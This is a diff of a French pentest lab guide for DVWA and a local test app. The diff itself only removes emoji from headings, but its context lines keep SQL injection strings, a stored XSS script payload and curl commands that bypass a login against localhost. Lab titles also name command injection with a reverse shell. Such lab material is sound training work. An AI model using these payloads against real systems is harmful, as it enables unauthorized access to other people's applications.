@@ -253,7 +253,7 @@ admin' OR '1'='1' --
 
 ## Lab 1.1 — Scan et découverte de DVWA
 
-### 📋 Fiche
+###  Fiche
 
 | Durée | Conteneur | Dossier | Outils |
 |---|---|---|---|
@@ -305,7 +305,7 @@ curl -s -c /tmp/dvwa_cookie.txt \
 
 ## Lab 1.2 — Exploitation XSS
 
-### 📋 Fiche
+###  Fiche
 
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
@@ -354,7 +354,7 @@ Message: <script>alert('Stored XSS')</script>
 
 ## Lab 1.3 — Injection SQL avec sqlmap
 
-### 📋 Fiche
+###  Fiche
 
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
@@ -407,7 +407,7 @@ Sortie attendue :
 
 ## Lab 1.4 — Command Injection + Reverse Shell
 
-### 📋 Fiche
+###  Fiche
 
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
@@ -449,7 +449,7 @@ ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
 
 ## Lab 1.5 — SQLi avancée : Trouver, Exploiter, Craquer
 
-### 📋 Fiche
+###  Fiche
 
 | Durée | Conteneur | Dossier | Techniques |
 |---|---|---|---|
@@ -502,11 +502,11 @@ curl -s "http://localhost:8083/?page=search&id=1%20AND%201=2" | grep -o "Aucun"
 ```bash
 # Normal → échoue
 curl -s -d "page=login&username=admin&password=wrong" "http://localhost:8083/" | grep "Identifiants"
-# → ❌ Identifiants incorrects
+# →  Identifiants incorrects
 
 # SQLi : bypass d'authentification
 curl -s -d "page=login&username=admin'%20--&password=x" "http://localhost:8083/" | grep "Connecté"
-# → ✅ Connecté en tant que admin
+# →  Connecté en tant que admin
 
 # SQLi : toujours vrai
 curl -s -d "page=login&username='%20OR%20'1'='1'%20--&password=x" "http://localhost:8083/" | grep -c "Connecté"
